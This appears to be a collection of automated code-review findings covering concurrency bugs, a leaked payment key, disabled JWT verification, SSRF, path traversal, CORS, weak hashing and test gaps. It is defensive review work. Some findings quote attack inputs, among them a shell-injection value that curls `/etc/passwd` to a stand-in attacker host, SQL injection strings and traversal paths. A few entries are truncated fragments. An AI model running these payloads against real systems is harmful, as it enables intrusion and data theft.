findings.title: Blocking requests.get inside async fetch_plan_limits stalls the event loop
findings.body:
`fetch_plan_limits` is declared `async` but its body contains no `await` — `requests.get` is a synchronous, blocking socket call. When called from an async handler it will block the entire event loop thread for the full duration of the billing request (up to the 5s `timeout`), stalling every other in-flight request on that worker, including the concurrent `fetch_plan` calls immediately above.

Use the async client that is already a dependency, mirroring `fetch_plan`:

```python
async def fetch_plan_limits(client: httpx.AsyncClient, tenant_id):
    response = await client.get(f"https://billing.internal/limits/{tenant_id}", timeout=5)
    return response.json()
```

If threading the client through is not practical here, at minimum wrap the blocking call in `anyio.to_thread.run_sync` / `asyncio.to_thread` so it does not occupy the loop. Note also that passing the client in (as `fetch_plan` does) reuses the connection pool, whereas `requests.get` opens a fresh TCP+TLS connection per call.

findings.title: No test exercises fetch_plan_limits' async/blocking behavior
findings.body: fetch_plan_limits is declared async but calls the blocking requests.get, which would block the event loop. There is no test in this diff (or shown repo) that would fail if this synchronous call were left in place, e.g. a test asserting the function does not block concurrent tasks or that it uses an async client. Since no test file accompanies this change, nothing here would catch a regression or confirm the intended async behavior.

findings.title: Unescaped tenant_id interpolated into internal billing URL path
findings.body:
`fetch_plan_limits` builds the request URL with an f-string: `f"https://billing.internal/limits/{tenant_id}"`. If `tenant_id` is caller-supplied and not validated upstream, values containing `/`, `..`, `?` or `#` change the path or query that is sent to the internal billing host (e.g. `../../admin/keys`, or `1?force=true`). That turns a plan lookup into an arbitrary-path request against an internal service that is presumably reachable only from this process.

Fix by validating the shape of `tenant_id` (UUID / `^[A-Za-z0-9_-]+$`) before use, or by letting the HTTP client do the quoting — e.g. `urllib.parse.quote(str(tenant_id), safe="")`, or pass it as a parameter rather than a path segment. Note that `requests`/urllib3 do not reliably collapse `..` segments for you, so relying on client-side normalisation is not a defence.

findings.title: Bare except swallows KeyboardInterrupt and SystemExit
findings.body:
`except:` with no exception class catches `BaseException`, so Ctrl-C (`KeyboardInterrupt`), interpreter shutdown (`SystemExit`), and `MemoryError` are all absorbed and converted into a normal `None` return. If `push_metrics` is called in a loop or from a long-running worker, a user's Ctrl-C can be discarded and the process becomes hard to stop; a `SystemExit` raised by a framework's shutdown path is likewise dropped. Narrow this to the failure you actually intend to tolerate — at minimum `except Exception:`, and preferably the specific transport/HTTP error type raised by `_client.send`.

_Also raised by the docs agent:_ Public function `push_metrics` lacks documented error behaviour

findings.title: No test covers push_metrics' new exception-swallowing behavior
findings.body: push_metrics now catches all exceptions (including KeyboardInterrupt/SystemExit via bare except) and returns None instead of propagating. There is no test verifying that a failing _client.send call results in push_metrics returning None rather than raising, so a regression (e.g. reverting to raising, or catching too narrowly) would not be caught.

findings.title: try_consume races on _counters: limit bypass and lost updates
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` on line 15, yields control at the `await asyncio.sleep(0)` on line 18, and only then writes `_counters[tenant] = current + cost` on line 19. Any other coroutine that runs during that suspension sees the old count, so N concurrent callers can each pass the `current + cost > LIMIT` check on line 16 and collectively push the counter well past `LIMIT`. Worse, the write on line 19 is an absolute assignment derived from the stale read rather than a read-modify-write, so an increment applied by `consume` (lines 9-11) while `try_consume` is suspended is silently discarded — the counter can even move backwards.

It also does not take `_lock`, which the sibling `consume` holds for exactly this state, so the module's own synchronisation invariant is broken.

Fix: wrap the whole read/check/write in `async with _lock:`, and do the write as a read-modify-write (`_counters[tenant] = _counters.get(tenant, 0) + cost`) so no update is lost. Also drop the `await asyncio.sleep(0)` inside the critical section, or if it must stay, note that awaiting under the lock is safe only because the lock serialises entry.

_Also raised by the security agent:_ Rate limit bypass: check-then-act across await without the lock

findings.title: Public async function lacks contract documentation
findings.body: `try_consume` is a public async function whose contract cannot be inferred from its name and signature alone. A caller needs to know: (1) what the return value means — does `False` mean the limit was exceeded or the operation failed?; (2) what `cost` represents and what units `LIMIT` uses; (3) whether there are any race conditions or consistency guarantees. The current implementation has a check-then-act race between lines 15–16 and line 19 (reads `_counters`, then after an await, writes without re-checking). This needs to be either documented as a known limitation or fixed, but it is invisible without a docstring.

findings.title: No test coverage for try_consume, including its race condition
findings.body: try_consume reads _counters, awaits, then writes without holding _lock, unlike consume. There is no test exercising concurrent calls to try_consume that would catch two coroutines both passing the limit check and double-incrementing past LIMIT, nor any test of the basic accept/reject behavior. If this function were reverted to an incorrect implementation (e.g., limit check flipped, or lock removed from consume), nothing in the diff or existing suite would fail.

findings.title: Mutable default `attempted=[]` is shared across all calls
findings.body:
`attempted=[]` is evaluated once at function definition, so every call that omits the argument mutates and returns the same list object. The second call to `send_with_retries(...)` will return the failed recipients from the first call as well, and the list grows unboundedly for the lifetime of the process. Use the same pattern already applied on line 2 of this file: `def send_with_retries(recipients, attempted=None):` then `attempted = list(attempted) if attempted is not None else []` (or `attempted = attempted if attempted is not None else []` if in-place mutation of a caller-supplied list is intended).

findings.title: Off-by-one slice drops one record per page
findings.body:
The slice ends at `start + PAGE_SIZE - 1`, so each page yields `PAGE_SIZE - 1` records. Because `start` still advances by the full `PAGE_SIZE` per page, the record at index `start + PAGE_SIZE - 1` is never returned on any page — iterating all pages silently loses one record per page from the export. Change the slice to `ordered[start : start + PAGE_SIZE]`, matching `page_of` on line 6.

findings.title: File handle leaks on header-mismatch return and on exceptions
findings.body:
`fh = open(path)` is only closed on the success path (line 16). When `header != expected_header` the function returns at line 14 with the handle still open, and any exception raised by `next(reader)` or `list(reader)` (decode errors, I/O errors, `StopIteration` on an empty file) escapes with the handle open too. On CPython this is masked by refcount collection, but under PyPy, or when the frame is kept alive by a traceback, the descriptor stays open — repeated validation failures will exhaust the fd limit.

Wrap the open in a context manager, exactly as `read_rows` does on line 5:

```python
def read_validated(path, expected_header):
    with open(path) as fh:
        reader = csv.reader(fh)
        header = next(reader, None)
        if header != expected_header:
            return None
        return list(reader)
```

findings.title: No test exercises the validation-failure path of read_validated
findings.body: read_validated returns None early on line 14 when the header doesn't match, without closing fh. No test in this diff covers this behavior change, so the leak (and any future fix or regression) would go unnoticed. A test should call read_validated with a mismatched header and verify the file handle is closed (e.g. via a mock or by checking fh.closed).

findings.title: Retry wraps non-idempotent charge() without an idempotency key
findings.body:
`charge()` is documented in billing/gateway.py as "NOT idempotent: each call creates a new charge." Wrapping it in `@retry(attempts=3)` means any failure that occurs after the POST has reached the gateway (timeout, dropped connection, 5xx on a request the gateway actually processed) will be retried and will create a second and third charge against the customer's card. This is a money-losing defect, not a theoretical one.

The gateway docstring already names the fix: it supports an `Idempotency-Key` header. Generate a key once in `charge_card` (per logical charge attempt, not per retry) and pass it through to `charge()`, so retries collapse to the same charge server-side. Alternatively, restrict the retry to errors that are provably pre-transmission (e.g. connection-establishment failures), or drop the retry here entirely and let the caller handle failure.

Note the contrast with `fetch_charge` on lines 5-7: `get_charge` is documented "Safe to repeat," so the retry there is correct. The same decorator is not safe on the write path.

_Also raised by the security agent:_ Retry wraps non-idempotent charge() without an Idempotency-Key

findings.title: Retried non-idempotent function lacks safety documentation
findings.body:
The new `charge_card` function wraps `charge()`, which the gateway docstring explicitly warns is NOT idempotent. Each retry will create a duplicate charge unless an Idempotency-Key is passed to the gateway. A caller reading only the `charge_card` docstring would not know this and would use the function incorrectly, creating duplicate charges on transient failures.

Add a docstring to `charge_card` that either: (1) explains the Idempotency-Key requirement, or (2) documents that this function is unsafe to retry and should only be used when the caller has set up idempotency at the gateway level.

findings.title: No test guards retrying a non-idempotent charge call
findings.body: charge_card wraps billing.gateway.charge, which its own docstring says is NOT idempotent and creates a new charge on every call. Wrapping it with @retry(attempts=3) means a transient failure (e.g. timeout after the gateway processed the charge) will cause a duplicate charge on retry, since no idempotency key is passed. There is no test in this diff exercising charge_card's retry behavior or verifying that a retried call does not double-charge, so this defect would ship silently.

findings.title: Naive datetime.now() subtracted from tz-aware expires_at raises TypeError

Subtracting an aware datetime from a naive one raises `TypeError: can't subtract offset-naive and offset-aware datetimes`, so `expires_within` fails on every invocation, not just at edge cases. Use `datetime.now(timezone.utc)` as `is_expired` on line 5 already does: `cutoff = datetime.now(timezone.utc).replace(microsecond=0)`.

To fix this, use `datetime.now(timezone.utc)` instead of `datetime.now()`, consistent with the pattern already established in `is_expired` on line 5.

""` — or, if callers require a real address, change the return type to `string | undefined` (or `null`) so the absence is visible in the signature rather than deferred to a crash.

findings.title: Overflow handling clears the entry just written (and all others)
findings.body:
When the cache reaches 1001 entries, `_CACHE.clear()` discards every entry, including the one written on line 10 for the tenant the caller just asked for. So on the boundary call, `get_tenant_fresh` returns the tenant but leaves the cache empty, and an immediately following `get_tenant(tenant_id)` returns `None` — the opposite of what the write on line 10 was for. It also drops every other warm entry at once, so all subsequent readers miss and re-`_fetch` simultaneously.

If a size bound is needed, evict selectively (e.g. `collections.OrderedDict` with `popitem(last=False)`, or `functools.lru_cache`), and evict *before* inserting so the new entry survives.

findings.title: No test coverage for get_tenant_fresh's cache mutation and eviction logic
findings.body: get_tenant_fresh fetches fresh data, writes it into the shared _CACHE, and clears the entire cache once it exceeds 1000 entries. None of this is exercised by any test in the diff: a bug in the eviction threshold, a bug that clears too eagerly/never, or a bug where the wrong key is written to _CACHE would all pass silently. Since this function has side effects distinct from the pure get_tenant lookup, it needs its own test verifying (a) the cache is updated with the fetched value and (b) the clear-on-overflow behavior triggers at the right threshold.

findings.title: Misleading function name: get_tenant_fresh mutates state
findings.body: `get_tenant_fresh` follows the `get_*` naming convention, which typically signals a read-only operation. However, this function mutates the `_CACHE` by writing to it and clearing it when full. Callers expecting idempotent read behavior could be surprised. Either rename it to reflect mutation (e.g., `fetch_and_cache_tenant`) or add a clear docstring explaining the side effects.

findings.title: Caller-controlled tenant_id can flush the shared cache on demand
findings.body: `get_tenant_fresh` inserts an entry for whatever `tenant_id` it is handed and, once the map exceeds 1000 entries, wipes the entire cache. If `tenant_id` is reachable from a request parameter, a caller can issue ~1000 requests with distinct (including non-existent) ids and evict every other tenant's entry, forcing all subsequent `get_tenant` calls to miss and pushing load onto `_fetch` for every tenant — a cheap amplification against a shared resource. Two mitigations worth considering: only cache entries for ids that `_fetch` actually resolves (avoid negative caching of arbitrary ids), and replace the clear-everything eviction with bounded LRU eviction (`collections.OrderedDict` + `popitem(last=False)`, or an existing cache utility) so one caller cannot discard other callers' entries.

findings.title: Command injection: shell=True with interpolated name/directory
findings.body:
`create_archive` interpolates `name` and `directory` straight into a shell string and executes it with `shell=True`. Any shell metacharacter in either argument escapes the intended command: `name = "x; curl attacker/$(cat /etc/passwd)"` or `name = "x`id`"` runs arbitrary commands with the privileges of the service process.

Fix by dropping the shell entirely and passing an argument list, exactly as the existing `list_exports` on line 5 already does:

```python
archive_path = os.path.join("/exports", f"{name}.tar.gz")
return subprocess.run(["tar", "-czf", archive_path, directory], check=True)
```

Separately, `name` is also concatenated into a filesystem path with no validation, so a value like `../../etc/cron.d/x` writes outside `/exports` even after the shell is removed. Constrain `name` to a safe character set (e.g. `^[A-Za-z0-9._-]{1,64}$`, rejecting `..`) and verify the resolved path stays under `/exports` before writing.

findings.title: Unquoted shell interpolation breaks on spaces and glob characters
findings.body: `cmd` is assembled by string interpolation and executed via `shell=True`, with neither `name` nor `directory` quoted. For entirely ordinary inputs this produces the wrong command: `create_archive("my report", "/data/q1 reports")` becomes `tar -czf /exports/my report.tar.gz /data/q1 reports`, so tar receives four operands instead of two and either fails or archives the wrong paths. A `directory` containing `*`, `?` or `~` is glob-expanded by the shell before tar sees it, and `;`/`&&`/backtick characters terminate the command entirely. Pass an argument list instead — `subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)` — matching the list form already used by `list_exports` on line 5; if a shell is genuinely required, wrap each interpolated value in `shlex.quote`.

findings.body: create_archive builds a shell command string via f-string interpolation of `name` and `directory` and executes it with shell=True. There is no test file in this diff exercising this function, so a change that breaks quoting/escaping, mishandles special characters in `name`/`directory`, or otherwise alters the constructed command would not be caught by any existing test.

findings.title: origin:"*" with credentials:true is rejected by browsers
findings.body:
The `cors` middleware with `origin: "*"` emits the literal header `Access-Control-Allow-Origin: *`. Per the Fetch spec, a user agent must fail any request made with `credentials: "include"` when the allow-origin header is the wildcard, regardless of `Access-Control-Allow-Credentials`. So this config does not achieve what it evidently intends (letting the new dashboard send cookies/auth headers) — those requests will be blocked in the browser, and preflights will fail too.

To make credentialed cross-origin requests work, reflect a specific allowed origin instead of `*`, e.g. pass a function or an explicit list (`origin: DASHBOARD_ORIGINS`) so the middleware echoes the request origin and adds `Vary: Origin`. If credentials genuinely are not needed for the dashboard, drop `credentials: true` instead and keep the wildcard.

findings.title: Wildcard CORS origin combined with credentials: true
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`. The two are mutually incompatible in the CORS spec: `Access-Control-Allow-Origin: *` may not be used with `Access-Control-Allow-Credentials: true`, so one of two bad outcomes follows depending on the middleware's implementation:

1. The middleware emits the literal `*` — every credentialed cross-origin fetch to the dashboard routes is rejected by the browser, so the endpoint is silently broken for its intended callers.
2. The middleware normalises `"*"` by reflecting the request's `Origin` header (several wrappers do this so that credentials keep working) — in which case any attacker-controlled page can issue cookie-bearing requests to the dashboard API and read the responses, giving cross-origin read access to authenticated data and bypassing the CSRF protection that same-origin policy would normally provide.

Fix by enumerating the dashboard's real origins, the way line 6 already does with `ALLOWED`, e.g. `origin: DASHBOARD_ALLOWED` (an explicit list or allowlist callback) rather than `"*"`. If the dashboard truly needs public, unauthenticated access, drop `credentials: true` instead.

I cannot see the routes this middleware is mounted on, nor which `cors` implementation is imported, so the concrete blast radius (which endpoints, which cookies) is not verifiable from this diff.

findings.title: Live payment API secret hardcoded in source, replacing env lookup
findings.body:
`ACMEPAY_SECRET_KEY` is a literal credential with an `acme_live_` prefix, committed into `billing/acmepay_client.py` and assigned to `acmepay.api_key`. Anyone with read access to the repository — including anyone who obtains a clone, a CI artifact, or a forked history — gains the production payments credential, and it stays exposed in git history even if the line is later removed.

Actions: (1) treat this key as compromised and rotate it at the payment provider now; (2) restore the previous `acmepay.api_key = os.environ["ACMEPAY_SECRET_KEY"]` (and the `import os` this diff deletes) or read it from your secret manager; (3) purge the value from history or confirm with the provider that the revoked key cannot be reused; (4) consider adding a pre-commit secret scanner so this class of regression fails before merge.

findings.title: Env-var configuration removed; all environments now pinned to a live key
findings.body: `client()` previously read `os.environ["ACMEPAY_SECRET_KEY"]`, which let each environment (dev, CI, staging, prod) supply its own key and failed fast with a `KeyError` when unconfigured. After this change the module-level constant on line 4 is used unconditionally, so the `ACMEPAY_SECRET_KEY` environment variable set by any existing deployment or test harness is silently ignored, and every environment — including CI and local dev — will authenticate against the live gateway implied by the `acme_live_` prefix. Tests or staging runs that previously no-op'd or errored will now issue real charges. Restore the environment lookup (optionally with an explicit default or a clear startup error) rather than embedding the value.

findings.title: client() behavior change has no test asserting acmepay.api_key
findings.body: client() was changed from reading ACMEPAY_SECRET_KEY out of the environment to assigning a hardcoded module-level constant. No test in this PR calls client() and asserts acmepay.api_key equals the expected value, so a regression here (e.g. reverting to env lookup, or assigning the wrong constant) would not be caught. findings.title: tenant_of returns an unverified, caller-forgeable tenant id
findings.body: `tenant_of()` calls `jwt.decode(..., options={"verify_signature": False})`, so the payload is parsed but never authenticated. Any client can mint a token with an arbitrary `tenant_id` (no key required) and this function will return it, which breaks tenant isolation for every caller that uses the result to scope a query or an authorization check. The sibling function `claims_for()` two lines above already does the verified decode with `public_key()`; `tenant_of` should be built on it, e.g. `return claims_for(token)["tenant_id"]`, rather than re-decoding unverified to skip the key lookup. In PyJWT, disabling `verify_signature` also turns off `exp`/`nbf`/`aud` validation by default, so expired tokens are accepted here too.

findings.title: tenant_id read from JWT with signature verification disabled
findings.body:
`tenant_of()` calls `jwt.decode(token, options={"verify_signature": False})` and returns `unverified["tenant_id"]`. A JWT is supplied by the client (header/cookie/param), so with verification off an attacker can mint any payload they like — base64 a header and body with `tenant_id` set to a victim tenant, append any signature — and this function will happily return it. If the returned value is used to scope queries, pick a database/schema, or authorise a request, it is a complete cross-tenant authorisation bypass. Disabling verification also skips `exp`, `nbf`, `iss` and `aud` checks, so revoked/expired tokens pass too.

Fix: derive the tenant from verified claims. The module already has `claims_for()` on line 7 which verifies with `public_key()` and pins `algorithms=["RS256"]`; implement `tenant_of` as `return claims_for(token)["tenant_id"]`. If the motivation was avoiding a key lookup, cache `public_key()` rather than skipping verification. If an unverified peek is genuinely needed (e.g. to select which key to fetch), name it `unsafe_unverified_tenant_hint()`, never use it for authorisation, and re-verify before acting. Also note `unverified["tenant_id"]` will raise `KeyError` on a token lacking the claim.

findings.title: New tenant_of() has no test coverage
findings.body: tenant_of() decodes the token with signature verification disabled and returns an attacker-controllable claim. There is no test in this diff verifying its behavior (e.g., that it extracts tenant_id, or documenting/guarding the unverified-decode choice). If this function's logic changes or is inadvertently 'fixed' to require verification (breaking callers) or left broken, nothing would fail.

findings.title: Public function `tenant_of()` lacks documentation of its verification behavior
findings.body: The function `tenant_of()` is a public API (alongside `claims_for()` which verifies) that deliberately disables JWT signature verification. A caller reading the name and signature would have no way to know this, and might assume it provides the same verification guarantees as `claims_for()`. This could lead to misuse in contexts where signature verification is required for security. Add a docstring explaining that signature verification is intentionally disabled and documenting the preconditions for safe use.

findings.title: Missing ownership check lets any user modify others' payment methods
findings.body:
`update_payment_method` takes `pm_id` from the request, fetches the object with `PaymentMethod.get(pm_id)` (line 12) and immediately writes `body["billing_name"]` and calls `pm.save()` (lines 13-14) — no authorisation check happens between the load and the mutation. `current_user(request)` on line 11 only authenticates; its result is assigned to `user` and then never used, which strongly suggests the `require_owner` call was simply forgotten. Any authenticated user can enumerate or guess `pm_id` values and rewrite the billing name on another account's saved payment method.

Fix: add `require_owner(user, pm)` immediately after the fetch, mirroring line 6:

```python
user = current_user(request)
pm = PaymentMethod.get(pm_id)
require_owner(user, pm)
```

Ideally also scope the query to the owner (`PaymentMethod.get_for_user(pm_id, user.id)`) so the default is safe. Consider a regression test that asserts a 403 when user A updates user B's payment method.

_Also raised by the correctness agent:_ body["billing_name"] raises KeyError when the field is absent

findings.title: Public endpoint contract undocumented: authorization missing
findings.body: The `update_payment_method` function is a public endpoint (parameter names match the HTTP handler pattern: `request, pm_id, body`) but has no docstring describing its authorization behavior. A caller or maintainer cannot determine whether it enforces ownership—and in fact, it does not call `require_owner()` as the codebase pattern requires. The repository establishes in `auth.py` that 'Every object mutation must call this' (line 8 of the context), making the absence of both documentation and the authorization call a contract violation.

findings.title: read_export_preview skips _confined(), allowing escape from EXPORT_ROOT
findings.body:
The sibling reader above resolves the caller-supplied `name` through `_confined(name)` before opening it (line 14). `read_export_preview` instead does a raw `os.path.join(EXPORT_ROOT, name)`, so any `name` containing `../` walks out of the export directory, and an absolute `name` (e.g. `/etc/passwd`) makes `os.path.join` discard `EXPORT_ROOT` entirely and open that path directly. Route the new function through the same helper: `path = _confined(name)` and then read `limit` bytes. Keeping the two readers on different validation paths is exactly the kind of divergence that gets missed later.

_Also raised by the security agent:_ Path traversal: read_export_preview skips _confined() on `name`

findings.title: No test would catch missing path confinement in read_export_preview
findings.body: read_export_preview builds its path with a raw os.path.join(EXPORT_ROOT, name) instead of the _confined() helper used by the neighboring handler (line 14). If a caller passes name='../../etc/passwd', this function would read outside EXPORT_ROOT. Nothing in this diff exercises this function, so this behavior difference from its sibling would go unnoticed until exploited or reported. Add a test asserting that read_export_preview raises/rejects a name containing '..' or an absolute path, mirroring whatever test exists (or should exist) for the confined handler.

findings.title: SQL injection via f-string interpolation in search_customers
findings.body:
`search_customers` interpolates `term` and `status` straight into the SQL text and calls `execute(sql)` with no parameter tuple, so the values are parsed as SQL by the driver. Either argument can close the quote and append arbitrary SQL — e.g. `status = "x' OR '1'='1"` returns every customer row, and a value containing `'; DROP TABLE customers; --` is limited only by whether the driver permits multiple statements.

Fix it the same way line 5 already does — pass values as parameters and keep the wildcards in the bound value, not in the SQL:

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))
```

Note the docstring on `billing/db.execute` states `params` must carry every caller value, so this call also violates the helper's documented contract.

findings.title: search_customers bypasses execute()'s params contract, breaks on quotes/None
findings.body:
`billing.db.execute` documents that `params` "must carry every caller value", and `get_customer` on line 5 follows that by passing `(customer_id,)`. `search_customers` instead builds the whole statement with an f-string and calls `execute(sql)` with `params=None`, so no caller value reaches the driver as a bound parameter.

Beyond the contract, this is wrong for reachable inputs: a `term` or `status` containing an apostrophe (e.g. `O'Brien`) terminates the quoted literal and the statement fails or changes meaning, and `None` renders as the literal string `'None'` rather than matching NULL/being rejected.

Rewrite in the same shape as line 5, e.g. `execute("SELECT * FROM customers WHERE name LIKE %s AND status = %s", (f"%{term}%", status))`, keeping the wildcards in the parameter value rather than in the SQL text.

findings.title: search_customers has no test exercising its query construction
findings.body: The new search_customers function builds its SQL via f-string interpolation of `term` and `status`. There is no test in this diff verifying the query it produces or its behavior with adversarial input (e.g. a name containing `%`, `'`, or SQL metacharacters). If this function were changed or fixed to use parameters, nothing would fail; if it were left broken, nothing would fail either. This is the kind of behavior change that has zero coverage.

findings.title: SSRF: verify_endpoint fetches caller-supplied URL with no allowlist or scheme check
findings.body:
`verify_endpoint(url)` passes the URL straight into `requests.get` with no validation. The function immediately above it (lines 8-10) demonstrates the intended control for this module: parse the host and reject it unless it is in `ALLOWED_HOSTS`. The new function skips that entirely.

Consequences an attacker gets from a webhook-registration flow:
- Reach internal-only services and cloud metadata (`http://169.254.169.254/...`, `http://localhost:*/`), using the returned status code as an oracle for internal port/host scanning.
- Use non-HTTP schemes that `requests` or its adapters may accept (e.g. `file://` via a custom adapter) since there is no scheme check.

Fixes:
1. Route through the same validation as `post_webhook`: resolve the URL, require `https` (or `http`/`https`), and check the host against `ALLOWED_HOSTS` before issuing the request — ideally by extracting the existing check into a shared `_assert_allowed(url)` helper so the two paths cannot drift again.
2. Pass `allow_redirects=False` (or re-validate each hop), otherwise an allowlisted host can 302 the request to an internal address and bypass the check.
3. Do not return raw response detail to the caller beyond what is needed; the status code alone is already a weak oracle, so rate-limit this endpoint.

_Also raised by the correctness agent:_ verify_endpoint skips the ALLOWED_HOSTS check the sibling function enforces

findings.title: verify_endpoint lacks any test and skips the host allowlist check
findings.body: verify_endpoint performs a server-side GET against a caller-supplied URL but, unlike the function above it, does not call the host-allowlist validation (lines 8-9) before making the request. No test exists to confirm this function validates its input the same way the existing post path does, so a regression (or the missing check itself) would go undetected.

findings.title: verify_endpoint raises instead of reporting unreachable endpoints
findings.body: The declared return value is an HTTP status code, which suggests callers will branch on it (e.g. `if verify_endpoint(u) == 200`). But the common failure modes for a user-supplied URL — DNS failure, connection refused, TLS error, the 5s timeout firing, or a malformed URL — all raise `requests.exceptions.RequestException` (or `MissingSchema`) rather than returning a code, so a verification call against a bad endpoint propagates an exception into the caller instead of a "this endpoint is not reachable" result. Catch `requests.RequestException` and return a sentinel (or `None`) with the contract documented, or rename/redefine the function to return a boolean/result object so the failure case is part of the return shape.

findings.title: Invoices bucket disables all S3 public access block guardrails
findings.body:
`aws_s3_bucket_public_access_block.invoices` sets `block_public_acls`, `block_public_policy`, `ignore_public_acls` and `restrict_public_buckets` all to `false` for `acme-customer-invoices`. The PR description says only the assets bucket is meant to be public, so this looks like the assets block was copy-pasted.

Disabling these four settings does not by itself publish the objects, but it removes the only backstop that prevents a future bucket policy, a `public-read` ACL, or an object uploaded with a public canned ACL from exposing customer invoices to anonymous readers on the internet. Any principal that can call `PutBucketPolicy`/`PutObjectAcl` — or any application bug that sets an ACL — becomes a data-disclosure path.

Fix: either delete the `aws_s3_bucket_public_access_block.invoices` resource and rely on the account-level block, or set all four attributes to `true`. Consider also adding an explicit deny-non-TLS / deny-public bucket policy for a bucket of this sensitivity.

_Also raised by the correctness agent:_ Invoices bucket public access block disables all protections

_Also raised by the docs agent:_ Public access block for invoices bucket contradicts PR intent

findings.title: verify_acmepay compares HMAC with == instead of compare_digest
findings.body:
`verify_acmepay` computes the same HMAC hexdigest as `verify_stripe` one line above, but returns `expected == header`. Python's `==` on str short-circuits on the first differing byte, so comparison time leaks a prefix-match oracle that lets an attacker recover a valid signature byte by byte without knowing the secret. Change line 12 to `return hmac.compare_digest(expected, header)` to match line 7.

Secondary behavioural difference worth deciding deliberately: `compare_digest` raises `TypeError` when `header` is `None` or a non-ASCII `str`, whereas `==` silently returns `False`. If any caller relies on `verify_acmepay` tolerating a missing header, add an explicit `if not header: return False` guard before the compare rather than leaving the unsafe operator in place.

_Also raised by the security agent:_ Webhook signature compared with == instead of compare_digest

findings.title: New verify_acmepay function has no test coverage
findings.body: The diff adds a new public function verify_acmepay with no corresponding test in the diff. Nothing would catch a regression here (e.g. wrong hash algorithm, broken comparison logic, or the timing-unsafe `==` itself being 'fixed' incorrectly). Since verify_stripe presumably has tests exercising correct/incorrect signatures, verify_acmepay should have equivalent tests for valid signature, invalid signature, and (if it matters to this codebase) timing-safety expectations.

findings.title: Reset passwords hashed with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` derives a password hash with a single unsalted MD5 round. MD5 is a fast, GPU-friendly digest with no work factor and no per-user salt, so anyone who obtains the stored value (DB dump, backup, log) can recover the plaintext at billions of guesses per second, and identical passwords across users produce identical hashes, enabling rainbow-table lookup.

The correct primitive is already in this file: use `bcrypt.hashpw(raw.encode(), bcrypt.gensalt())` as `hash_password` on line 7 does, and verify with `bcrypt.checkpw`. If the reset flow needs a one-time token rather than a password hash, generate it with `secrets.token_urlsafe` and compare with `hmac.compare_digest` instead of hashing a user-supplied secret.

I cannot see the caller of `hash_reset_password` in this diff or in any retrieved context, so I cannot name the exact HTTP entry point; the sink itself is unambiguous regardless of which handler feeds it.

findings.title: hash_reset_password returns a format bcrypt verification cannot check
findings.body: `hash_password` returns a bcrypt modular-crypt string (`$2b$...`), which is verified with `bcrypt.checkpw`. `hash_reset_password` returns a 32-char MD5 hex digest for what is evidently the same stored-password column. If both values land in the same field, the existing verifier will either raise/return False for every reset-set password (bcrypt.checkpw rejects a non-bcrypt salt) or the code needs a second, format-sniffing verification branch that is not present in this diff. Reset passwords should go through `hash_password` so one verification path covers all stored credentials; if a distinct one-time-token hash is really intended, it should not share the password column and should be named and stored accordingly.

findings.title: Public password hashing function lacks security context
findings.body: The function `hash_reset_password` is exported and callable, but contains no docstring or comment explaining why MD5 is used here despite `hash_password` using bcrypt. A caller reading this function in isolation might assume it is safe for password storage. Even if this is intentional (e.g., for a one-time token), the rationale should be documented.

This test calls render() with an empty invoice but never checks the result. It will pass regardless of what render() returns, including if it raises no exception but produces wrong output, or even returns None unexpectedly (unless render itself throws).

findings.title: Patch target misses the name actually used by send_with_retry
findings.body:
`notify/sender.py` does `from notify.transport import deliver`, which binds `deliver` as an attribute of the `notify.sender` module at import time. Patching `notify.transport.deliver` rebinds the attribute on the *transport* module only; `send_with_retry` still resolves its module-global `deliver` and calls the real function. The test therefore exercises the real transport (three live delivery attempts) and its assertion passes or fails on whatever the real `deliver` happens to return, proving nothing about the retry/give-up path.

Use the same target as the adjacent passing test on line 2: `mocker.patch("notify.sender.deliver", return_value=False)`. Consider also asserting the call count is 3 so the test actually pins down the retry behaviour it is named after.

findings.title: csv_rows joins values without calling csv_escape
findings.body: `csv_rows` builds each line with `",".join(str(r.get(c, "")) ...)` and never passes the value through `csv_escape`, which is defined immediately below for exactly this purpose. Any cell containing a comma or a double quote will split into extra columns or unbalance quoting, so the output is not parseable CSV for a perfectly ordinary input (e.g. `{"a": "Smith, J"}`). Wrap the stringified value: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`. Note this also fixes the fact that `csv_escape` currently assumes a `str` argument — `"," in value` raises `TypeError` on an int or `None`, so the `str(...)` should stay on the caller side.

findings.body: csv_rows, csv_escape (in reports/csv_export.py), dump_streaming, dump_pretty (in reports/json_export.py), and margins_for, usable_width (in reports/pdf_export.py) are all new public functions with real branching/formatting logic, but no tests were added for any of them. The repository already has a precedent of one test per exporter function (test_csv_header_matches_columns), so this is a gap relative to the project's own standard, not an external ideal. A regression in comma/quote escaping, chunked JSON boundaries, or margin arithmetic would go undetected.

findings.title: csv_rows bypasses csv_escape, allowing CSV field/record injection
findings.body:
`csv_rows` interpolates each value directly into a comma-joined line (`",".join(str(r.get(c, "")) ...)`) while the escaping helper intended for exactly this purpose, `csv_escape`, is defined three lines below and never called. A value such as `a,b` splits into two fields, a value containing `"` corrupts quoting, and a value containing `\n` or `\r` terminates the record early — letting whoever controls a single field value shift or forge downstream columns and rows for any consumer that parses the export.

Apply the escape at the point of rendering: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`. Note that `csv_escape` also does not handle newlines (they need quoting too) and, if these files are opened in a spreadsheet, values beginning with `=`, `+`, `-`, or `@` are treated as formulas; prefixing those is the usual mitigation. Using the stdlib `csv` module would cover the structural cases for free.

I cannot see the caller in this diff or in the retrieved context, so I cannot confirm that row values originate from untrusted input — confidence reflects that.

findings.title: Date-equality assertion races the UTC midnight boundary
findings.body:
`issue_token()` captures a timestamp at one instant and line 11 captures another with `datetime.now(timezone.utc)`. The assertion only holds if both instants fall on the same UTC calendar day, so any run that crosses midnight UTC between the two calls fails, non-reproducibly. Make the test deterministic instead: inject/freeze the clock (e.g. pass an explicit `now` or patch the time source `issue_token` uses) and assert equality against that fixed value, or assert a bounded delta such as `abs(datetime.now(timezone.utc) - token.issued_at) < timedelta(seconds=5)` which has no calendar-boundary discontinuity.

If `now` has no default in the signature this raises `TypeError`; if it does default to the real clock, the assertion becomes another wall-clock-dependent check (it holds only while `expires_at` is still in the future, which is a second timing dependency on top of the midnight issue). Pass an explicit `now=` here too so the test asserts on a fixed clock.

